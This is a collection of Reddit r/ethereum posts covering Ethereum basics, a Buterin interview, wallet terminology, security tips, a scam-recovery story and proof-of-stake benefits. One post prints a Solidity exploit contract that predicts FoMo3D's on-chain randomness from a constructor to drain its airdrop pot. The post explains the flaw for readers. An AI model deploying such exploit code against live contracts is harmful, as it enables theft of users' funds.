added every 15 seconds. Ethers are generated as a miner's reward for adding a block, however there's no hard cap on their total emission. Current yearly network issuance is approximately 4.5%, and will be reduced with ETH 2.0## Ethereum tokensEthereum is also a very convenient platform for the creation of tokens - digital units circulating on a blockchain and representing a certain value assigned to them by their creator. Its **ERC20** (fungible) and **ERC721** (non-fungible) tokens have become the standards in the industry and are being used extensively.## DAOEthereum can be used to build Decentralized Autonomous Organizations (DAO). A **DAO is an organization with governance defined by smart contracts registered on a blockchain**. A DAO allows a group of persons to interact using an open source protocol with auto-executing qualities; this protocol and the associated smart contracts formalize the organisation's operation rules. Once deployed, a DAO is independent from its creator and isn't controlled by an entity, but rather by a consensus between its participants, according to its blockchain-registered code. The owners of tokens associated with a DAO are assigned voting rights and are often rewarded for their participation in the DAO's governance.The transparency and immutability of the blockchain make such organizations difficult to corrupt, proposing an alternative model to centralized organizations. There are lots of DAO in the DeFi (Decentralized Finance), the most famous being Maker DAO - a lending platform managing the dollar-pegged stablecoin DAI.## ETH 2.0 and Casper Ethereum relying on a PoW consensus, it has its standard disadvantages: the blockchain is rather slow, costly and energy consuming. To overcome these drawbacks an important update has been planned since Ethereum conception: initially called Serenity and now mostly referred to as **ETH 2.0**, this update has been released in December 2020. It has been deployed on a parallel chain first, in order to conduct all the necessary tests before becoming the main Ethereum chain.ETH 2.0 relies on a consensus called **Casper**, which is a version of the PoS consensus: validator nodes stake a minimum amount of 32 ETH to be able to propose a block or to validate it. The new consensus would also improve the blockchain's scalability, allowing a blocktime of just a couple of seconds.ETH 2.0 will also affect the annual Ether emission rate, which will be significantly decreased, or even become negative.## Ethereum todayEthereum is the most popular blockchain for DApps development, with over 5000 DApps built on it. It is a major blockchain for the Decentralized Finance, or DeFi, with an important new metrics - TVL (Total Value Locked), representing the collateral locked in different types of DeFi applications - exceeding $50 BN worth of crypotoassets. ETH 2.0 is a major ambition for Vitalik Buterin. According to the Ethereum creator, the 4 major problems that need to be solved to push Ethereum to the next level are privacy, consensus safety, smart contract safety, and ‚Ääscalability. Some would add a governance issue to the list, for its role in blockchain's life is crucial.

It may even save some of you from doing bad investments, and maybe see what direction you should look in, and maybe shed some light on the possible future of the crypto.I find that the crypto waters are murky today and Vitalik's thoughts make it clearer for me.[Link to the source on Rusbase](https://rb.ru/opinion/buterin-rock-and-roll/)---In 2017 the Ethereum founder Vitalik Buterin made it to the top ten of the most influential young people according to the Fortune magazine. Some call him the crypto god, some ‚Äì a crypto-anarchist, and some just idolize him.Any rumor on Vitalik affects the Ethereum exchange rate and costs or makes the Ethereum holders large amounts of money.Rusbase attended an open discussion with the rock star of blockchain and got to know what the 23-year-old genius thinks and what happens in the industry.**On himself and Ethereum**1. How did I become interested in blockchain? There was a moment when I realized that this is a very interesting technology with strong mathematics and then I understood that there was a serious concept behind this, a transparency system. A community of several thousand people created their own financial system. This idea is very close to me. I like building something that no one has ever built before.2. Creating Ethereum was not a question of money, it was a mission, an idea that you want to follow.3. In 2011 I learned about bitcoin, and six months later I cofounded a bitcoin magazine [Bitcoin Magazine ‚Äì Ed.], two years later I was in the university [University of Waterloo - Ed.] and I was spending 30 hours a week on bitcoin programming tasks. Then I dropped out, traveled around, and watched blockchain projects develop in different countries of the world. In Israel, USA, Europe.4. The idea to create Ethereum was not an immediate one. At first, I pitched it in the project that I worked in. But I was told it'd take a year to complete it. Then I quit. I remember walking around San Francisco, thinking, and then I just wrote a white paper and sent it to my friends, and they shared it with their friends. And it all started.  **On mining**5. The role of mining will decrease over time. This trend is not promising.6. Mining as a business... This happens when you have your own source of energy or a subsidized source of energy. Then this is profitable. But anyway it's better to move towards the blockchain application, not speculation.7. If you want to invest money, invest it in R&D.    **On the blockchain prospects**8. The first and the biggest blockchain prospect of the blockchain development is the financial one. This is cryptocurrencies, smart contracts, and state registry. For example, now it takes you several weeks to sell a house, whereas it can take just 3 minutes.9. Besides the financial area, I'd say the following areas are prospective: the Internet security; the logistics; anything that has to do with identity; a more expensive but also a safer information storage.10. The advantage of the blockchain is that there is a lot of data in the network that you can use for different purposes. The simplest example is the smart contract that lets you decrease the need for other types of insurance.   **On ICOs**11. The problem with ICOs is that someone makes something useful for a very small amount of people. Everyone sees now that there is open source software where you can make money easily. The developers now have the option to keep working in the basement or buy a Lamborghini.12. There are now so many projects where the token is absolutely useless and people just want to make a lot of money.13. The ICO concept is too centralized. The problem is that people evaluate the idea and not the team behind it. The investors put their money in the idea and there is no guarantee that the team will actually manage to do it. I think one needs to keep an eye on this and keep investing only if it's successful. And a better way would be to invest in the idea and not a specific team as there should be several teams competing for the investments to implement the idea.14. The moment will come when the market realizes that many of the tokens that exist today have no value.15. Tokening must have a purpose. The majority of the ICOs today don't have any backing and will fail.   **On the cryptocurrency prospects**16. I think that the cryptocurrency will not replace money 100% but in 20 to 40 years there's going to be a lot of different cryptocurrencies that will be used together.17. The number of cryptocurrencies is going to increase. There will be cryptocurrencies for different cities, big companies will issue their own cryptocurrencies, like that Burger King case I heard about.18. In 50 years everyone will have a wallet with 15 different types of cryptocurrency and you will be able to use them to make payments.   **On the blockchain security**19. There is a paradox now. The purpose of the blockchain is security. But the blockchain is a new technology that has security issues.20. Right now you can safely use blockchain where no one will take damage if the blockchain breaks.   **On Russia**21. Attracting the investments based on blockchain is a very interesting thing for Russia, especially when you consider the imposed sanctions.22. The expertise of the IT professionals in Russia is high, but there's just not enough of them.23. No other country has the same degree of the desire to implement the technology. In Russia any place you go ‚Äì everyone discusses the blockchain, everyone is fascinated by it: from the higher officials to the small time entrepreneurs.24. The blockchain in Russia needs smaller successful projects to prove itself.   **On the world**25. The blockchain is a part of the bigger trend. The world is becoming more and more digital. In 50 years people are going to have more friends abroad than in their own country.26. Southeast Asia is very technological, but they don't have the same amount of interest as there's here [in Russia]. However, people there use QR-codes to sell oranges.   **A happy end**27. The cryptocurrencies are never going to be stable. However, the degree of volatility is going to decrease with the emergence of successful blockchain startups and with the increase in the volume of money in the cryptocurrencies. This will happen in a year or two.28. The blockchain now is in Phase 3. Here's what this means:* Phase 1: Several hacker anarchists become interested in it.* Phase 2: Putin knows what blockchain is ‚Äì this is the hype phase.* Phase 3:  The road from the hype to the real results. People know that the blockchain is an interesting idea. People know how to use it and they are already testing it. However, there's still no application on the big scale.**EDIT**: I am disappointed that this has become a political discussion, 'Russia is bad and corrupt'. Make of that what you will. Don't let the media brainwash you. Russia has many problems just like any other government.

You can saving the fancy versions of it (e.g. the Keystore File / Mnemonic Phrase).- Example: `afdfd9c3d2095ef696594f6cedcae59e72dcd697e2a7521b1578140422a4f890`### Keystore File- Encrypted version of your private key in JSON format (though it does not have a JSON extension) - A fancy version of your private key that is protected by a password of your choosing.- When combined with the password, it has the private key.- Safer than a private key because you need the password.- File name usually is in the format `UTC` + `--` + `DATE_CREATED` + `--` + `YOUR_ADDRESS_WITHOUT_THE_OX`- Example of File Nae: `UTC--2017-07-02T20-33-09.177Z--06a85356dcb5b307096726fb86a78c59d38e08ee`- Example of Contents: `{'version':3,'id':'aa811d53-fe9a-44a2-bd1c-e737007b5591','address':'06a85356dcb5b307096726fb86a78c59d38e08ee','Crypto':{'ciphertext':'f5a7cc8d4b8cf93510b0d0d057f3a52ac79fd48e619e0638c4ffd978ca180248','cipherparams':{'iv':'975ab00192e2dd74170e91ca59c0b0bd'},'cipher':'aes-128-ctr','kdf':'scrypt','kdfparams':{'dklen':32,'salt':'0210f0d0b99e440dfbceb36373304638bac093a367ee7da6411cd165f7aa907a','n':1024,'r':8,'p':1},'mac':'8197a747a3855a10546a2ff939c36470daed78e393b670efa0c12fe3b23dd7e3'}}`- (pw: `mypassword`)### Mnemonic Phrase- Another fancy version of your private key, that is actually used to derive multiple private keys.- A (typically) 12 or 24 word phrase that allows you to access infinite number of accounts.- Used by Ledger, TREZOR, MetaMask, Jaxx, and others.- Originates from [BIP 39 Spec](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki).- The accounts you can access with this phrase are determined by the 'path'.- Example 12-words: `brain surround have swap horror body response double fire dumb bring hazard`- Example 24-words: `card enrich gesture connect kick topple fan body blind engine lemon swarm venue praise addict agent unaware equal bean sing govern income link leg`### Hardware Wallet:- Typically, a single-purpose device that 'holds' your private key(s), ensuring your private keys are safe.- Typically, they use a 24-word phrase. This phrase you should write down (not on your computer) and store separately from your hardware wallet.- If you lose your hardware wallet, you can still gain access to your accounts & funds via the word-phrase you wrote down.- Never type the word-phrase on your computer. It defeats the purpose of your hardware wallet.### AddressIdenticon / AddressIcon:- The colorful blob of colors that corresponds to your address.- It is an easy way to see if your address is correct.- [Example 1](http://i.imgur.com/lHUrIiZ.jpg)- [Example 2](http://i.imgur.com/FvyLewS.jpg)- *Note: the above addresses are a single character different but have remarkably different icons & colors. Magic!*### Hexadecimal- Used all over Ethereum for a variety of things, a hexadecimal string is comprised of the numbers `0 1 2 3 4 5 6 7 8 9` and `A B C D E F`### Seed- The input given to derive a private key. This should always be generated in a truly random way, not something you make up with your measly human brain.- If you chose the seed, it is known as a `brain wallet`### Brain Wallet- An account generated from a seed or password or passphrase of your choosing.- Humans are not capable of generating enough entropy and therefore the wallets derived from these phrases are insecure.- Brain wallets can be brute forced by super fast computers.- [Brain wallet are insecure.](https://www.reddit.com/r/ethereum/comments/45y8m7/brain_wallets_are_now_generally_shunned_by/)- Don't use brain wallets.### Entropy- Also known as 'randomness'.- The more random something is, the more entropy it has, and the more secure it is.- Usually defined in 'bits of entropy' or the number of years it would take to brute-force a ________ (e.g. private key) derived with that much entropy.- Ethereum private keys are 256-bit keys- 24-Word mnemonic phrases are also 256 bits of entropy. 2048 words in the dictionary. 11 bits of entropy (the words). `11 * 24 = 264`.

Looking through the code, it's multiple contracts totaling thousands of lines of code. Let's be honest, $12M inside thousands of lines of Solidity... that's asking for it.One thing that immediately caught my eye whilst looking through their code was:    modifier isHuman() {      address _addr = msg.sender;      uint256 _codeLength;          assembly {_codeLength := extcodesize(_addr)}      require(_codeLength == 0, 'sorry humans only');      _;    }Ok, lemme rename that. I believe '`isHumanOrContractConstructor'` is a much better name for it. I guess you see where this is going. If the entire FoMo3D contract suite is based on the assumption that it can only be called from plain accounts (i.e. you can't execute complex code and can't do reentrancy)... they're going to have a bad time with constructors.We now have our attack vector, but we still need to find a place to use it. I'm sure there are a few places to attempt to break the code, but the second thing that caught my eye was:    /**    * @dev generates a random number between 0-99 and checks to see if thats    * resulted in an airdrop win    * @return do we have a winner?    */    function airdrop()    private    view    returns(bool)    {      uint256 seed = uint256(keccak256(abi.encodePacked(      (block.timestamp).add      (block.difficulty).add      ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add      (block.gaslimit).add      ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add      (block.number)      )));          if((seed - ((seed / 1000) * 1000)) < airDropTracker_)        return(true);      else        return(false);    }Oh boy! On chain random number generation... just what we needed! I.e. at this point, we can create transactions that within their constructor can calculate the result of this '`airdrop()'` method, and if it's favorable, can call arbitrary methods on the FoMo3D contract (potentially multiple times).Looking through the code to see where '`airdrop'` is being used, we can find that that any contribution larger than 0.1 Ether gets a chance to win 25% of some ingame stash. And that's the last missing piece of the puzzle. We can create a contract that can 100% win (or not play in the first place). So, here's a full repro ('*'*I didn't test it mind you, just wrote up the pseudocode, it may not be fully functional yet'*'*).    pragma solidity ^0.4.24;        interface FoMo3DlongInterface {      function airDropTracker_() external returns (uint256);      function airDropPot_() external returns (uint256);      function withdraw() external;    }        contract PwnFoMo3D {      constructor() public payable {        // Link up the fomo3d contract and ensure this whole thing is worth it        FoMo3DlongInterface fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);        if (fomo3d.airDropPot_() < 0.4 ether) {          revert();        }        // Calculate whether this transaction would produce an airdrop. Take the        // 'random' number generator from the FoMo3D contract.        uint256 seed = uint256(keccak256(abi.encodePacked(          (block.timestamp) +          (block.difficulty) +          ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +          (block.gaslimit) +          ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)) +          (block.number)        )));            uint256 tracker = fomo3d.airDropTracker_();        if((seed - ((seed / 1000) * 1000)) >= tracker) {          revert();        }        // Ok, seems we can win the airdrop, pwn the contract        address(fomo3d).call.value(0.1 ether)();        fomo3d.withdraw();        selfdestruct(msg.sender);      }    }I didn't get to try out my little exploit, because the attack loses 0.1 ether for every 'airdrop' call, so the only way to make it worthwhile is to wait until the airdrop's prize is > 0.1 ether. Given the 25% payout, that means airdrops need to total to > 0.4 ether. However, I saw a peculiarity that it never actually went above that value. So digging through the chain, I actually found someone who was skimming the airdoprs for 2 days now :))[https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3](https://etherscan.io/txs?a=0x73b61a56cb93c17a1f5fb21c01cfe0fb23f132c3)[https://etherscan.io/tx/0x86c3ff158b7e372e3e2aa964b2c3f0ca25c59f7bcc95a13fd72b139c0ab6f7ad](https://etherscan.io/tx/0x86c3ff158b7e372e3e2aa964b2c3f0ca25c59f7bcc95a13fd72b139c0ab6f7ad)Their attack code is not really available, but looking through a successful transaction you can see that they have a more elaborate pwner code: they try to deploy a new contract, but if the address is not a winner (per the evaluation of '`airdrop()'`, they don't revert, rather keep creating nested contracts until one succeeds). GG!This attack only PWNs 1% of the FoMo3D contract suite as only that's the amount sent into airdrops. But to paraphrase the devs from their contracts: '*'*'lolz''*'*.And the team's reaction: yeah, we knew our 12M contract can be broken, no biggie.[https://twitter.com/PoWH3D/status/1021380251258114049](https://twitter.com/PoWH3D/status/1021380251258114049)https://preview.redd.it/v4xlb6ga8pb11.png?width=1164&format=png&auto=webp&v=enabled&s=b0f64f7ef2e36d6c4f499d32ff8660eb179c0904",False,"How to PWN FoMo3D, a beginners guide",u/[deleted],0,669,0.89,https://www.reddit.com/r/ethereum/comments/916xni/how_to_pwn_fomo3d_a_beginners_guide/,[]

This will help all the newbies navigate the security measures in cryptoverse.&#x200B;* **ENABLE 2FA Authenticator everywhere. Use a separate email for crypto. Use google authenticator instead of SMS authenticator. NO QUESTIONS ASKED.*** **You take it off the exchange. You do not leave your coins on the exchange.  ' NOT YOUR KEYS, NOT YOUR COINS.'** The only times I leave coins on the exchange is when I know that I am looking to buy more coins in the next several hours. That way I avoid paying fees multiple times to withdraw from the wallet. But with coins like ADA , SOL, ONE where the fees is so low that it might even be worth getting the coins off the exchange even if you do intend to buy more coins in the next 12-24 hours.  **Alternatively, if you bought BTC or ETH/ERC-20 tokens,** you could possibly wait till your done accumulating for the session and then pay the fee at once to pull your coins out. Sure you have to pay the transaction fees but hey, that's the cost of doing business here.*  ALWAYS do regular scans on your main computer which you use to buy/store your coins for malware and other threats. *  Never publicly reveal your holdings. Never trust anyone who reveals their holdings publicly either. They are either malicious or they are lying or they are just stupid. You do not need to associate with such people in any case.*  Never use the email you use for your social accounts as your exchange's email. If you have made that mistake already, consider changing the mail or alternatively changing the account. Yes, it may sound extreme but it is worth it.*  Do not visit shady websites from your main computer. Sure, you may have anti-virus but do not risk it. Especially avoid visiting illegal websites that stream shows, sports events and porn.*  Do invest in a hardware wallet as soon as you feel it is worth it. BUT MAKE SURE that you buy directly from the manufacturer's website or from a very reputable retailer.*  I would always suggest choosing wallets which have multiple assets storage over  storing your assets in separate chrome extension wallets. Particular example comes to mind with EXODUS vs YOROI when staking ADA. *  FACT CHECK EVERYTHING. I have lost quite a bit (not crypto but in general) by not questioning people because I was afraid I would offend them. If they are correct, they will always be delighted to prove their point. * DOUBLE CHECK EVERYTHING. Double check whether you pasted the correct wallet address. Double check the authenticator code.

That motivated me to submit a lengthy explanation on how it was the future of the internet, the price would eventually recover and there was nothing to worry about. Turns out Ethereum is officially dead again, selling at 130 usd. Why? Because it is boring. The ICO craze is over and we're experimenting a long-lasting hangover. Normal people are saturated with crypto and going on with their lives. Google trends are down. Nobody is here. You can hear the crickets. And that won't change any soon. But, once again, there is nothing to worry about, as long as you're patient: eventually things will change because, as I've told you before, credit cards are stupid, fiat is mortal, and Ethereum has the perfect momentum to eventually become the worldwide economy; it can't die, by design. Once we have new exciting stuff that makes people entertained and curious, they'll be back. Meanwhile, here are some suggestions to have some fun and speed up this process.## A book seriesFirst, we really need a good series based on crypto. I'm thinking of something like cyber wars, where people around the world realize crypto is money, and money is power, thus online factions fight over control over it all. It should be realistic and reference the real crypto history as much as possible, giving coolish explanations for things like Satoshi Nakamoto, MtGox, TheDAO incident, Bitconnect and so on; there is endless source of material. I'd say a good book would aggregate more value on the field as 3.6 research breakthroughs. Don't underestimate the power of literature to moving people's mind. Any writer around?## Funding developers just to develop things they likeDevelopers are the most important resource we have They're the crypto equivalent of cattle in Indian culture. They build the towers and castles that protect our lands from all evil. They're sacred. Problem is, developers need food to survive, and that little inconvenience causes most of them to get sucked by projects that have money. And guess who has money? Scammy ICOs. What I'm saying is that, honestly, most developers of this field, today, are working in projects that produce no real value. It is a well-known fact that the most amazing inventions of humanity came from developers on their spare times, working in things they loved. See Gmail, Youtube, Twitter, Facebook and the wheel. As such, I suggest we start a decentralized platform to give developers crypto-currencies to just develop what they like. No question asked. As long as they're building stuff, and they're enjoying it, we should give them $$$. If we can give millions to scammy ICOs, we can do that. I hypothesize that, as a result, mind-blowing things will be created and we'll grow at a unforeseen pace. So, let's do it!## GamesWe need to build games. But not games like CryptoKitties which, while cool as a concept, are essentially classic games in a blockchain suit. We need games that are truly decentralized. Think of a huge RPG world where people can travel around, battle, collect epic items and trade them in an emerging economy. But not only that: a game without a central developer, where people all around the world contributing with art, map, code, and a decentralized system for adopting changes. Or, who know, an e-sport such as a MOBA like LoL, or a card game like Heartstone, without a central company behind its development. The good thing about games is that they're so inclusive, people love games, and it takes one good game to make a case for crypto. We need more of them!## A governmentYou may or may not have noticed, but governments are fueled by money. The only reason you have to pay taxes to the U.S. is that it is powerful (rich) enough to force you to. Once crypto-currencies inevitably become more valuable than fiat, the power of those states will decrease. There will be anti-tax movements, people will stop respecting governments, and eventually the old power will fade away as decentralized governments emerge. That is far from happening, of course, but we can already experiment. So, I have a suggestion: let's create the Decentralized State of Earth! A pretend-to-be universtal state with laws, taxes and even an army. When someone asks, it is just a silly joke, and our army is actually composed by kitten. Of course, secretly, we'll be building a real army of dolphins....That's it. Thanks for listening to this old man!

I thought all of my money was lost, and hit a dead end everywhere I looked, but luckily all hope wasn't lost, and I was able to miraculously recover my funds + basically doubled what I had while causing the scammers to waste thousands of dollars on gasNow for the meat and the potatoes of what happened as soon as I got scammed. I immediately freaked out and tried to do whatever I can to uncover the identity of these scammers. The phishing website they created (now deleted) was https://fox-game.art/ and i did a Whois lookup, but the scammers had covered their tracks pretty well [as seen here](https://imgur.com/a/zIh0eZm). They'd used namecheap (which basically hides their true email, IP, address, phone number, etc) so the details of the website couldn't be traced back to them.Now I decided lemme check out the blockhain and see previous transactions that they did, [from their address](https://etherscan.io/address/0x1d8d12f3f242ef6c409b2fec7ebb0dcdfcfa348a), and I found out they had sent their funds over to a [proxy address](https://etherscan.io/tx/0x7f692afe5e4e81509506ecca24445e5393cacee6f9a9502d4f5d65521ee0b5aa) before [cashing out via fixedfloat](https://etherscan.io/tx/0xf37593fb40eaf81e8c1d7630ca64e3e7e3f4f6dcaed923077863c1eec3956039)Armed with this info I fired off an email o fixedfloat, and to the privacy email address which was connected to their email (think of it like a string of characters that each individual using namecheap has, but until they reply, their real email isn't exposed), and hoped that something happened. As a matter of fact, something did happen. Fixedfloat reached out to me and announced they blacklisted their wallet, and they'd freeze their funds the next time they made a transaction, and the scammers, freaked out by the threatening email I sent tried to cash out 0.067 eth, or the amount the scammed from me via fixedfloat as a test to see if my threat had any sustenance.And it did! Fixedfloat froze the 0.067 eth they sent, and the scammers freaking out emailed me( don't know if I can share em here because of doxxing stuff) but they immediately refunded the eth they stole from me, and started begging me to tell fixed float that I had made a mistake with my report, so I decided to play their game, and wasted their time by telling them that the only way I'd help em out is if they sent 1 ETH to the burn address, but sadly they were cheap stakes and realized that the situation had reached a point of no return, and basically moved their funds out via tornado cashFixedfloat said they'd refund me if they got an email from a law enforcement agency and pass on the scammers info, or if 3 months passed, and they didn't hear anything back from them (I'm pretty sure they don't have anything to say since the scammers spent 0.15 ETH a moving money into tornadocash)Either way, I was super lucky that the scammers took my bait and responded to my email I sent, and they revealed their email, as well as refunded me, but there are a couple of things you can do if your in a similar situation, and ended up getting scammed, even though prevention and being smart is the best way to avoid the headache in the first place. 1. Do a Whois lookup, and try to find the scammers email or other identifying information and reach out to them, and notify them that your going to report them to law enforcement unless they refund you 2. Check out their wallet, because they have to convert their crypto to fiat at one point, and often use a swap service or centralized exchange, to whom you can reach out to  3. File a police report and contact other law enforcement entities because most exchanges will use that to release their funds back to you, if they seize em, or forward their information to law enforcement agencies so they can pursue charges",False,How I used the blockchain against scammers who scammed me and got them to double my funds free of charge,u/[deleted],6,652,0.97,https://www.reddit.com/r/ethereum/comments/r861k7/how_i_used_the_blockchain_against_scammers_who/,[]

I've chosen to make a crypto game inspired by the popular Civilization series, with some changes to fit smart contracts ie not truly turn-based but rather time-based.The slow pace of this kind of game is perfect for Ethereum, which requires players to wait after every turn before they see the effects of their actions; and makes block mining time a feature rather than a hindrance because you'll be much more thoughtful about which step you'll take next, be it acquiring territory, gathering particular resources, creating and moving troops, attacking enemies, etc.  in a hegaxon-grid-based world.Now I'm in beta stage and looking to see if there is interest in this kind of game on Ethereum. I've deployed the contracts on both the Ropsten and Mainnet blockchains. If you want to test the game completely free you can try the Ropsten version, whereas if you already want to earn ETH, you can try the mainnet version.

However, I believe most people are overlooking the biggest concern that could be drawn from it. There were 3 giant centralized exchanges in cryptocurrency: Binance, Coinbase, and FTX. One of them is now on the edge of bankruptcy. There is a huge danger in narrowing that list to two. If a large percentage of people decide to sell after what's happened, how can we know that Coinbase and Binance have enough liquidity to facilitate withdrawals? The gains that crypto has seen dwarf the revenue collected by exchanges. One of the first things that happened during the Great Depression were mass attempts to withdraw cash from banks who did not have that cash on hand. Stable coins are not a solution. If you can't sell them, you can't spend them. Tether limited is not a central bank. No matter how much USDT is minted, they cannot create more USD out of thin air.I'm not trying to fear monger, but people should be more concerned and should be demanding more transparency for centralized exchanges.

Most of these benefits will theoretically become available *immediately* after the merge.* **Block time distribution**: in PoW, blocks are distributed according to a [Poisson distribution](https://en.wikipedia.org/wiki/Poisson_distribution), so there is a high variance between the time between two blocks. On average you get one block per 13 seconds, but there are occasional intervals where there's more than 30 or even more than 60 seconds between two blocks. When you send a transaction, on average you have to wait 13 seconds for the next block to appear. In PoS, blocks appear on a regular schedule: one block per 12 seconds, and when you send a transaction, on average you have to wait 6 seconds. The only exception is skipped proposers, which are rare. Combined with EIP 1559, this will massively improve Ethereum's UX.* **Faster pre-finality confirmation**: we talk about finality, where after '~2 epochs a block gets confirmed in such a way that it cannot feasibly be reverted. But even before then, security ramps up much more quickly than in PoW, because the LMD GHOST fork choice rule with hundreds of attestations in parallel creates much faster convergence than PoW's 'one consensus step per block' model. After even just 12 seconds, a block already has hundreds of attesters supporting it, already making it very hard to revert.* **Better light client protocols**: light clients for PoW ethereum [exist](https://medium.com/@rauljordan/a-primer-on-ethereum-blockchain-light-clients-f3cadde49137), but they are far less efficient than they could be, and they still require quite a bit of time and resources to turn on and maintain. The PoS light client protocol is [much more well-designed](https://github.com/ethereum/eth2.0-specs/blob/dev/specs/altair/sync-protocol.md) after learning from this experience, and requires only a minimum few kilobytes per day to stay in sync. This can make in-browser and mobile PoS light client wallets much more viable, reducing trust on centralized providers.* **Faster ability to detect network issues**: in a PoW network, if half of nodes go offline or start acting improperly because of a bug, hack or attack, it takes some time for this to become known, because at first there's not enough information to distinguish what's going on from random chance. In a PoS network, on the other hand, you can easily see participation dropping from 99% to something much lower within a single slot, and you immediately know that something is going on.There are also many smaller secondary benefits. The PoS switch gives us a natural opportunity to coordinate on a time when the ETH network protocol stops supporting the pre-merge chain, resetting the amount of data that clients need to download. The existing data structures in the beacon chain (particularly the historical block root and state root list) make accessing history from within the EVM much easier (the same benefit that [EIP 2935](https://eips.ethereum.org/EIPS/eip-2935) was trying to accomplish). The SSZ structure makes history proofs of any kind much easier to implement; additionally, a more complete switch from RLP to SSZ could significantly simplify Merkle proof generation for the protocol in general.The merge isn't just about the switch to proof of stake by itself; there's a lot more that we get along with it!",False,Some less-appreciated benefits of Ethereum's PoS,u/[deleted],25,601,0.99,https://www.reddit.com/r/ethereum/comments/mxo151/some_lessappreciated_benefits_of_ethereums_pos/,[]

I am in a unique position of being part of both their Consensus and Construct 2017 conferences and wanted to share my perspective on their company, staff, and how they recently handled a situation involving [Omar Bham](https://twitter.com/OmarBham) and his [Youtube Channel](https://www.youtube.com/user/obham001).## Situation with Omar**tl;dr: Youtuber Omar live streamed content from Coindesk's Consensus 2017 conference and Coindesk acted hostile and unprofessional in their handling of a well respected community member. Now Omar's Youtube channel has been banned from live streaming for 3 months.**Omar Bham is a Youtuber who discusses relevant cryptocurrency news. I met him in person recently at Consensus 2017 and found him to be a very nice,  enthusiastic guy. As part of his cryptocurrency channel, he posted content, including live content, from Consensus 2017. Omar recently released a YouTube video where he discusses his exchange between himself and the Head of Strategy at Coindesk via email and the actions Coindesk took. [Click here for a the full story from Omar](https://www.youtube.com/watch?v=4CmsVeNk2Qc&t=1306s).- Head of Strategy at Coindesk contacted Omar by email to set up a call to arrange payment for licensing Coindesk's content that appeared on Omar's site. - Omar responded that he would need to delay the call as his flight back from Consensus was delayed and would be unavailable.- Omar asked that they reschedule or just send him the details on the payment/licensing terms via email.- Coindesk replies the next day> Hi Omar. Since we did not connect today and you have no permission or authorization from Coindesk, please remove all videos related to Consensus from your website, computer, thumb drive, YouTube channel, and any other soft or hard copies **immediately**. Attendees are not permitted to record at the event as per our terms and conditions of attendees. Please confirm that all materials have been deleted as of today. Regards, [Employee Name]'- Omar took screenshots before the conference of any Terms and Conditions he could find to make sure he would not be breaking any rules before the conference.- After reading the email, Omar tried to delete the videos from his channel, but found that he had a 'copyright strike' from Coindesk. Because 4 of his live streamed videos were flagged for copyright violations, Omar has lost the ability to live stream from his channel for 3 months.## Coindesk the Company and StaffThe staff at Coindesk are incredible. Throughout multiple conferences I have gotten to know many of them. They truly care about the crypto community. There has been some backlash recently against Coindesk over perceived favoritism of ETC compared to ETH, or downplaying ETH all together. Here are some things that I am sure of:- All of the writers I know, which are most of the ones who report on Ethereum, are not against ETH.- Although Coindesk is owned by Digital Currency Group (DCG), none of the writers that I know are directly or indirectly influenced by DCG or anyone at DCG (including Barry Silbert). - DCG supports both ETH and ETC through their subsidiaries and companies they have invested in such as Grayscale and Etherscan.## Bottom Line and What I Want Out of This- I want an explanation from Coindesk that includes a copy of the attendee terms and conditions that they claim Omar is violating. I would also like to know the licensing costs. I am currently in violation of the ToC based on [this video that is still online](https://twitter.com/hudsonjameson/status/866639904326995968).

I'm the guy who put together and demonstrated [Toastycoin and Burnable Payments](http://www.toastycoin.com). After Toastycoin, I scratched my head a lot over how to scale up the research and development of more cryptoeconomic primitives.**This has lead me to start a free, virtual academy, focused on the rapid development of smart contracts and their interfaces.** Seminars start next Monday, and a schedule will be announced later this week. Seminars will be archived publicly.No enrollment process--just tune in live (and ask questions!) or watch the archives.## CPA: The CryptoPrimitive Academy[CPA](http://cpacademy.io) is a non-profit, non-coin enterprise founded on two major premises:1. There is a large, untapped pool of talented developers, who would be happy to help build the dapp ecosystem--if only they had a reliable source of personalized guidance for determining not only **how to build dapps**, but more fundamentally, **what to build and why.**2. A subset of dapps, known as **cryptoeconomic primitives**, will likely be the bedrock upon which larger Ethereum applications are built. But because cryptoeconomic primitives are (by definition) non-proprietary, they don't return profit or increase coin value--so research and development into this field is lacking. Addressing this lack would directly increase the utility of Ethereum to developers, thereby indirectly doing the same for users.CPA will bring these two dynamics together first by designing and developing cryptoeconomic primitives live via the seminars, but also by viewing work on cryptoeconomic primitives as a kind of opt-in coursework.Students who choose to engage in this coursework can apply for CPA accreditation, which will be granted if they've made substantial progress on the cryptoeconomic primitive in question, without significant outside guidance.We expect to cultivate a welcoming community made up of students of varying skillsets, which both educates its members and produces cryptoeconomic primitives that directly increase Ethereum's utility.### Office HoursStarting next Monday, I'll be online and available, minus occasional lunch/coffee breaks, between **UTC weekdays 17:00 and 01:00.** During this time, I'll be available on the CryptoPrimitive slack ([invite here](https://cp-slack-invite.herokuapp.com/)) to answer any questions related to the coursework.### Pre-reqsWe will assume all students are comfortable with OOP and can understand simple JS and/or Python code. Anyone can join the seminars, of course, but we may ignore questions that seem to come from ignorance in these areas.### SeminarsSeminars will start next week on Monday, and occur on a regular weekly schedule. This schedule will be determined after reviewing the comments from this post, but remember that all seminars will be archived and publicly available.Most seminars will consist of me simply livestreaming the design and development of a cryptoeconomic primitive from the ground up, verbalizing my thought process, and doing my best to answer any questions in the chat. Some questions will be answered more fully in a blog post at the end of each week.The first two seminars will be livestreamed development of an extremely basic dapp, and will serve as a tour around some of the tools used. The first seminar will focus on building the contract itself (Solidity), and the second will focus on the interface (JS and/or Python).Subsequent seminars will focus on implementing specific cryptoeconomic primitives, continuing in the style of livestreamed development with Q&A. When deciding on the next project to tackle during the seminars, I'll be taking student interest heavily into account.The exact schedule and subjects of the first set of seminars will be determined later this week and sent out to the mailing list. Sign up for that [here](https://visitor.r20.constantcontact.com/d.jsp?llr=cfjazc6ab&p=oi&m=1130743473314&sit=ke8rgopmb&f=30cfc2bd-aba1-4875-b771-77dd294e1eaa).### CourseworkCoursework is optional, unless one wants to become accredited. All coursework will focus on cryptoeconomic primitives: non-proprietary, simple tools or apps that are immediately practical (whether stand-alone or as a building block for larger systems).By the time seminars start on Monday, we will have provided a list of cryptoeconomic primitive tasks and projects. CPA will provide direct guidance to 